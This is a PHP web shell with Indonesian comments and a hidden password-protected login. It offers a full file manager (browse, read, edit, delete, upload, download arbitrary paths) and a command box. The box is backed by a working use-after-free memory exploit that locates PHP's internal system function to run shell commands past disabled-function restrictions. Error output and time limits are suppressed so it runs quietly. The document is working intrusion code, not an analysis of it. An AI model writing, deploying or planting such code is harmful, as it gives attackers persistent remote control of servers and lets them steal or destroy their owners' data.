<?php
ignore_user_abort(true);
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 5000);
// Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik
$hashed_password = '$$2y$10$8V2wFp3NzDNEjcNmmmCn1eshIANCwU5Nn10S6SlmYktX5fFsruXMG';

// Fungsi untuk menampilkan form login
function admin_login() {
    echo '<form method="post">';
    echo '<input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password">';
    echo '</form>';
    exit;
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
    // Memeriksa apakah password dikirim dan benar
    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
        // Logika setelah login berhasil
    } else {
        admin_login();
    }
}

$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex"><title>Dashboard</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';

if(isset($_POST['c'])){
    $xmd=$_POST['c'];
    pwn($xmd, get_path());
}

function pwn($xmd, $currentPath) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    // Jalankan perintah dalam direktori yang diberikan
    $command = "cd $currentPath && $xmd";
    ($helper->b)($command);
    exit();
}


function get_post($name){
    return (isset($_POST[$name]) ? $_POST[$name] : false);
}
function get_get($name){
    return (isset($_GET[$name]) ? $_GET[$name] : false);
}
function makeInput($type,$name,$val = "", $style = ""){
    if(in_array($type,['text','password','submit','file'])){
        return "<input type='$type' name='$name' value='$val' style='$style'/>";
    }
    return "<$type name='$name' style='$style'>$val</$type>";
}
function makeForm($method, $inputArray,$file = ""){
    $form = "<form method=$method enctype='$file'>"; 
    foreach($inputArray as $key=>$val){
        $form .= makeInput($key,(is_array($val) ? $val[0] : $val), (isset($val[1]) ? $val[1] : ""), (isset($val[2]) ? $val[2] : ""));
    }
    return $form."</form>";
}
function makeTable($thead,$tbody){
    $head = "";
    foreach($thead as $th){
        $head .= "<th>$th</th>";
    }
    $body = "";
    foreach($tbody as $tr){
        $body .= "<tr>";
        foreach($tr as $td){
            $body .= "<td>$td</td>";
        }
        $body .= "</tr>";
    }
    return "<table><thead>$head</thead><tbody>$body</tbody></table>";
}
function makeLink($link,$text,$target = ""){
    return "<a href='$link' target='$target'>$text</a> ";
}
function get_path(){
    $path = __dir__;
    if(get_get('path')){
        $path = get_get('path');
    }
    return $path;
}
function filesize_convert($bytes){
    $label = array( 'B', 'KB', 'MB', 'GB', 'TB', 'PB' );
    for( $i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++ );
    return( round( $bytes, 2 ) . " " . $label[$i] );
}
function fileTime($path){
    return date("M d Y H:i:s", filemtime($path));
}
function download_file($download){
    if(!is_file($download)){
        return false;
    }
    header('Content-Type: application/octet-stream');
    header('Content-Transfer-Encoding: Binary');
    header('Content-disposition: attachment; filename="'.basename($download).'"');
    return readfile($download);
}
function delete_file($delete){
    if(is_file($delete)){
        return unlink($delete);
    }
    if(is_dir($delete)){
        return rmdir($delete);
    }
    return false;
}
function edit_file($edit){
    if(is_file($edit)){
        return makeForm('POST',
            ['textarea'=>['edit',htmlentities(file_get_contents($edit)),"width:100%;height:90%"],
            'submit'=>['save','Save']]);
    }
    return false;
}
function save_edit($path,$str){
    if(is_file($path)){
        file_put_contents($path,html_entity_decode($str));
        return true;
    }
    return false;
}
function view_file($path){
    if(is_file($path)){
        return htmlentities(file_get_contents($path));
    }
    return false;
}
function new_file($path,$name){
    if(!is_file($path.'/'.$name)){
        file_put_contents($path.'/'.$name,"");
        return true;
    }
    return false;
}
function new_dir($path,$name){
    if(!is_dir($path.'/'.$name)){
        mkdir($path.'/'.$name);
        return true;
    }
    return false;
}
function upload_file($path,$file){
    $name = basename($file['name']);
    if(!is_file($path.'/'.$name)){
        if(move_uploaded_file($file["tmp_name"], $path.'/'.$name)){
            return true;
        }
    }
    return false;
}
function get_back($path){
    if($path == "" || $path == "/"){
        return $path;
    }
    $path = explode("/",str_replace('\\','/',$path));
    array_pop($path);
    return implode("/",$path);
}
function get_dir(){
    $path = get_path();
    if(!is_dir($path)){
        return false;
    }
    $dir = scandir($path);
    $dirs = [];
    $files = [];
    $i = 0;
    foreach($dir as $d){
        if($d == '.' || $d == '..'){
            continue;
        }
        $p = $path.'/'.$d;
        $s = '--';
        $icon = "&#128193;";
        $t = fileTime($p);
        $l = makeLink("?path=$p",$d);
        $perms = substr(sprintf("%o", fileperms($p)),-4);
        $owner =  (function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : fileowner($p));
        $controller = 
            (is_file($p) ? makeLink("?edit=$p","Edit","_blank") : '').
            makeLink("?delete=$p","Delete","_blank").
            (is_file($p) ? makeLink("?download=$p","Download","_blank") : '');
        if(is_dir($p)){
            $dirs[] = [$icon,$i,$l,$s,$t,$perms,$owner,$controller];
        } else {
            $s = filesize_convert(filesize($p));
            $icon = "&#128221;";
            $files[] = [$icon,$i,$l,$s,$t,$perms,$owner,$controller];
        }
        $i++;
    }
    $items = array_merge($dirs, $files);
    return makeTable(['#','id','Filename','Size','Modified','Perms','Owner',''],$items);
}

if(get_get("delete")){
    delete_file(get_get("delete")) ? die("Deleted: ".get_get("delete")) : die("File not found");
}
if(get_get("edit")){
    if(get_post('save')){
        save_edit(get_get('edit'),get_post('edit'));
        echo "Saved";
    }
    $edit = edit_file(get_get("edit"));
    $edit ? die($edit) : die("File not found");
}
if(get_get('download')){
    @readfile(download_file(get_get('download')));
    exit();
}
if(get_post('newfile')){
    new_file(get_path(),get_post('filename')) ? die('Create: '.get_post('filename')) : die('File exites');
}
if(get_post('newdir')){
    new_dir(get_path(),get_post('dirname')) ? die('Create: '.get_post('dirname')) : die('Dir exites');
}
if(get_post('upload')){
    upload_file(get_path(),$_FILES['file']) ? die('upload: '. $_FILES['file']['name']) : die('Upload Error');
}
echo $head.
    "<body>".
    makeForm('POST',['text'=>['filename','File Name'],'submit'=>['newfile','Create']]).
    makeForm('POST',['text'=>['dirname','Dir Name'],'submit'=>['newdir','Create']]).
    makeForm('POST',['file'=>'file','submit'=>['upload','Upload']],'multipart/form-data').
    '<form method="post">
    <input type="text" name="c" size="30">
    <input type="submit" value="Kill">
    </form>' .
    makeLink("?path=".get_back(get_path()),"[Back]").
    (is_dir(get_path()) ? get_dir() : '<pre>'.view_file(get_path()).'</pre>')
    ."</body>";
?>
